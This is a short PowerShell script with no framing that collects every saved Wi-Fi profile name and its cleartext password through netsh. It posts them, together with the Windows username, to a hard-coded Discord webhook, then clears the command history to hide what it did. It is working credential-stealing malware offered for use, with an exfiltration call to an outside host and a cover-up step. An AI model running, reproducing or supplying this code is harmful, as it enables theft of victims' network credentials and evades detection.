
# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUMHApVkimI9a9grXHfaweogpPu80MQetIR2A5fy5pLVBut6tTQ  -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History